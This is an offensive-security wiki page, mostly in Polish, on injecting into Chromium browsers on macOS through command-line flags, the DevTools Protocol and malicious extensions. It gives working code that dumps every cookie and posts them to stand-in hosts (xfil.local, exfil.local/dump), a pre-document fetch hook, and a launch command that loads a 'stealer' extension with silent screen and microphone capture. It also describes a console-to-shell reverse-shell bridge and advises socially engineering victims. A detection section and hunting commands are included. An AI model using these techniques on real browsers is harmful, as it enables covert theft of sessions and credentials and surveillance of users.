# Chromium Injection w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informacje podstawowe

Przeglądarki oparte na Chromium, takie jak Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, korzystają z tych samych przełączników wiersza poleceń, plików preferencji oraz interfejsów automatyzacji DevTools. W systemie macOS każdy użytkownik z dostępem do GUI może zakończyć istniejącą sesję przeglądarki i ponownie uruchomić ją z dowolnymi flagami, rozszerzeniami lub endpointami DevTools działającymi z uprawnieniami celu.

#### Uruchamianie Chromium z niestandardowymi flagami w macOS

macOS utrzymuje jedną instancję interfejsu użytkownika dla każdego profilu Chromium, dlatego instrumentacja zwykle wymaga wymuszonego zamknięcia przeglądarki (na przykład za pomocą `osascript -e 'tell application "Google Chrome" to quit'`). Attackers typically relaunch via `open -na "Google Chrome" --args <flags>` so they can inject arguments without modifying the app bundle. Umieszczenie tego polecenia w użytkowniku LaunchAgent (`~/Library/LaunchAgents/*.plist`) lub hooku logowania gwarantuje, że zmodyfikowana przeglądarka zostanie ponownie uruchomiona po restarcie lub wylogowaniu.

#### Flaga `--load-extension`

Flaga `--load-extension` automatycznie ładuje rozpakowane rozszerzenia (ścieżki rozdzielone przecinkami). Połącz ją z `--disable-extensions-except`, aby zablokować legalne rozszerzenia i wymusić uruchomienie wyłącznie własnego payloadu. Złośliwe rozszerzenia mogą żądać uprawnień o dużym wpływie, takich jak `debugger`, `webRequest` i `cookies`, aby uzyskać dostęp do protokołów DevTools, modyfikować nagłówki CSP, obniżać poziom HTTPS lub eksfiltrować dane sesji natychmiast po uruchomieniu przeglądarki.

#### Flagi `--remote-debugging-port` / `--remote-debugging-pipe`

Te przełączniki udostępniają Chrome DevTools Protocol (CDP) przez TCP lub pipe, dzięki czemu zewnętrzne narzędzia mogą sterować przeglądarką. Google zaobserwowało powszechne nadużywanie tego interfejsu przez infostealery i począwszy od Chrome 136 (marzec 2025) przełączniki te są ignorowane dla domyślnego profilu, chyba że przeglądarka zostanie uruchomiona z niestandardowym `--user-data-dir`. Wymusza to App-Bound Encryption dla rzeczywistych profili, ale attackers can still spawn a fresh profile, coerce the victim to authenticate inside it (phishing/triage assistance), and harvest cookies, tokens, device trust states, or WebAuthn registrations via CDP.<sup>[[5]](#references)</sup>

#### Flaga `--user-data-dir`

Ta flaga przekierowuje cały profil przeglądarki (History, Cookies, Login Data, pliki Preference itd.) do ścieżki kontrolowanej przez attackera. Jest wymagana podczas łączenia współczesnych wersji Chrome z `--remote-debugging-port`, a także izoluje zmodyfikowany profil, dzięki czemu można umieścić w nim wstępnie przygotowane pliki `Preferences` lub `Secure Preferences`, które wyłączają monity bezpieczeństwa, automatycznie instalują rozszerzenia i zmieniają domyślne schemes.

#### Flaga `--use-fake-ui-for-media-stream`

Ten przełącznik omija monit o uprawnienia do kamery/mikrofonu, dzięki czemu każda strona wywołująca `getUserMedia` natychmiast otrzymuje dostęp. Połącz go z flagami takimi jak `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` lub poleceniami CDP `Browser.grantPermissions`, aby po cichu przechwytywać audio/wideo, udostępniać ekran lub spełniać kontrole uprawnień WebRTC bez interakcji użytkownika.

## Wzorce Delivery i ponownego uruchamiania obserwowane w praktyce

Nadużywanie CDP jest często etapem **post-exploitation**, a nie początkowym payloadem. W niedawnej kampanii wymierzonej w developerów korzystających z macOS użyto zatrutego etapu kompilacji Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), dzięki czemu kod wykonywał się wyłącznie wtedy, gdy ofiara **budowała** projekt, a nie wtedy, gdy tylko go klonowała lub otwierała. Po pierwszym wykonaniu malware infekował także inne drzewa `.xcodeproj`, dodawał złośliwe hooki Git `pre-commit` i przeszukiwał archiwa ZIP w poszukiwaniu kolejnych projektów Xcode.<sup>[[3]](#references)</sup>

W przypadku nadużywania Chromium ma to znaczenie, ponieważ attacker nie musi modyfikować samego pliku binarnego przeglądarki. Krótkotrwały stager build-phase / `osascript` może zamiast tego zainstalować **browser wrapper** (LaunchAgent, login item, wpis w Docku, trojanizowany launcher aplikacji itd.), który ponownie otwiera legalną przeglądarkę z flagami kontrolowanymi przez attackera za każdym razem, gdy użytkownik ją uruchamia.<sup>[[3]](#references)</sup>

> [!TIP]
> Na endpointach developerskich sprawdzaj pliki `.pbxproj`, `.git/hooks/pre-commit` oraz archiwa ZIP zawierające `.xcodeproj` pod kątem nieoczekiwanych poleceń `curl`, `osascript`, `xxd`, zagnieżdżonego `base64` lub logiki ponownego uruchamiania Chrome.

## Nadużywanie Remote Debugging i DevTools Protocol

Po ponownym uruchomieniu Chrome z dedykowanymi `--user-data-dir` i `--remote-debugging-port` można podłączyć się przez CDP (np. za pomocą `chrome-remote-interface`, `puppeteer` lub `playwright`) i skryptować workflow o wysokich uprawnieniach:

- **Kradzież cookies/sesji:** `Network.getAllCookies` i `Storage.getCookies` zwracają wartości HttpOnly nawet wtedy, gdy App-Bound encryption normalnie blokowałoby dostęp do systemu plików, ponieważ CDP prosi uruchomioną przeglądarkę o ich odszyfrowanie.
- **Manipulowanie uprawnieniami:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` pozwalają omijać monity kamery/mikrofonu (szczególnie w połączeniu z `--use-fake-ui-for-media-stream`) lub fałszować kontrole bezpieczeństwa oparte na lokalizacji.
- **Wstrzykiwanie keystrokes/skryptów:** `Runtime.evaluate` wykonuje dowolny JavaScript wewnątrz aktywnej karty, umożliwiając kradzież credentials, modyfikowanie DOM lub wstrzykiwanie beaconów persistence, które przetrwają nawigację.<sup>[[1]](#references)</sup>
- **Eksfiltracja na żywo:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` przechwytują uwierzytelnione żądania/odpowiedzi w czasie rzeczywistym bez pozostawiania artefaktów na dysku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Ponieważ Chrome 136 blokuje CDP w domyślnym profilu, skopiowanie istniejącego katalogu `~/Library/Application Support/Google/Chrome` ofiary do ścieżki stagingowej nie zapewnia już odszyfrowanych cookies. Zamiast tego zastosuj socjotechnikę, aby nakłonić użytkownika do uwierzytelnienia się wewnątrz instrumentowanego profilu (np. podczas „pomocnej” sesji wsparcia) lub przechwytuj tokeny MFA w tranzycie za pomocą kontrolowanych przez CDP hooków sieciowych.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Praktyczny wzorzec malware może wyglądać następująco:

1. Uruchamiaj ponownie userland implant lub wrapper przy każdym uruchomieniu Chrome.
2. Uruchamiaj prawdziwą przeglądarkę z `--remote-debugging-port=<port>` oraz, w Chrome 136+, zwykle z powiązanym niestandardowym `--user-data-dir=<dir>`.
3. Uruchom helper, który łączy się z lokalnym WebSocketem CDP i rejestruje hook wykonywany przed dokumentem za pomocą `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Taki helper może wstrzyknąć JavaScript **zanim** uruchomi się kod witryny, co doskonale nadaje się do hookowania `window.fetch`, `XMLHttpRequest`, dostawców portfeli lub procesów autofill bez modyfikowania plików na dysku.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Silniejszy wariant zamienia przeglądarkę w **host command bridge**: wstrzyknięty JavaScript emituje `console.log` oznaczony separatorem, lokalny helper nasłuchuje `Runtime.consoleAPICalled`, usuwa znacznik, wykonuje pozostałą część za pośrednictwem powłoki hosta (na przykład przez Go `exec.Command`) i zwraca stdout/stderr przez WebSocket atakującego. Rozszerza to wykonywanie skryptów na poziomie karty do w dużej mierze fileless reverse shell.<sup>[[3]](#references)</sup>

## Injection oparte na Extension przez Debugger API

Badania „Chrowned by an Extension” z 2023 roku wykazały, że złośliwe extension korzystające z API `chrome.debugger` może dołączyć do dowolnej karty i uzyskać te same uprawnienia DevTools co `--remote-debugging-port`.<sup>[[6]](#references)</sup> Podważa to pierwotne założenia izolacji (extensions pozostają w swoim kontekście) i umożliwia:

- Cichą kradzież cookies i credentials za pomocą `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modyfikowanie uprawnień witryn (kamera, mikrofon, geolokalizacja) oraz omijanie security interstitial, co pozwala stronom phishingowym podszywać się pod okna dialogowe Chrome.
- Manipulowanie ostrzeżeniami TLS, pobieraniem plików lub promptami WebAuthn in-path poprzez programowe użycie `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` lub `Security.handleCertificateError`.

Załaduj extension za pomocą `--load-extension`/`--disable-extensions-except`, aby nie była wymagana żadna interakcja użytkownika. Minimalny background script weaponizujący to API wygląda następująco:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension może również subskrybować zdarzenia `Debugger.paused`, aby odczytywać zmienne JavaScript, modyfikować skrypty inline lub dodawać niestandardowe breakpointy, które przetrwają nawigację. Ponieważ wszystko działa wewnątrz sesji GUI użytkownika, Gatekeeper i TCC nie są uruchamiane, dzięki czemu technika ta idealnie nadaje się dla malware, które uzyskało już execution w kontekście użytkownika.<sup>[[6]](#references)</sup>

## Wykrywanie i Hunting

- Generuj alerty dla przeglądarek Chromium uruchomionych z `--remote-debugging-port`, `--remote-debugging-pipe` lub podejrzanym `--user-data-dir`, szczególnie gdy procesem nadrzędnym jest `bash`, `sh`, `osascript`, `xcodebuild` lub helper LaunchAgent.
- Szukaj krótkich łańcuchów, w których helper otwiera lokalny CDP WebSocket, rejestruje `Page.addScriptToEvaluateOnNewDocument`, a następnie nawiązuje długotrwałe połączenie wychodzące WebSocket/HTTPS.
- Wyszukuj mosty console-to-shell, korelując aktywność przeglądarki `Runtime.consoleAPICalled` z procesami potomnymi shell lub helper wykonującymi polecenia dostarczone przez atakującego.
- Na Macach deweloperskich sprawdzaj wpisy `PBXShellScriptBuildPhase` w `.pbxproj`, hooki Git `pre-commit`, mechanizmy ponownego uruchamiania Dock/login item oraz projekty Xcode zawarte w ZIP-ach pod kątem instalacji browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Narzędzia

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatyzuje uruchamianie Chromium z rozszerzeniami payload i udostępnia interaktywne hooki CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Podobne narzędzie skoncentrowane na przechwytywaniu ruchu i instrumentacji przeglądarki dla operatorów macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteka Node.js do skryptowania zrzutów Chrome DevTools Protocol (cookies, DOM, uprawnienia), gdy instancja z `--remote-debugging-port` jest aktywna.

### Przykład
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Znajdź więcej przykładów w linkach do narzędzi.

## Referencje

- [1] [Chrome DevTools Protocol - domena Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - domena Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: szczegółowa analiza najnowszej wersji XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) na X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Zmiany przełączników zdalnego debugowania w celu poprawy bezpieczeństwa - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: wykorzystywanie Chrome DevTools Protocol za pośrednictwem Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
